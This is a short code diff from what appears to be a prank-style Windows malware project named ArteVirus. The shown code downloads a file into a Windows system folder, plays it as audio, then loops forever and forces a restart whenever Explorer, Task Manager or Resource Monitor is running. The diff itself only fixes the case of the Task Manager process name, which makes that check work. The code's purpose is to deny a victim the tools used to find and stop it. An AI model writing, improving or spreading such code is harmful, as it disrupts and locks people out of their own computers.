@@ -14,5 +14,5 @@ f4 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\error.mp3", url4)
 ArteVirus.play_music(f4)
 
 while True:
-    if ArteVirus.is_process_running("explorer.exe") or ArteVirus.is_process_running("taskmgr.exe") or ArteVirus.is_process_running("resmon.exe"):
+    if ArteVirus.is_process_running("explorer.exe") or ArteVirus.is_process_running("Taskmgr.exe") or ArteVirus.is_process_running("resmon.exe"):
         ArteVirus.restart_pc()
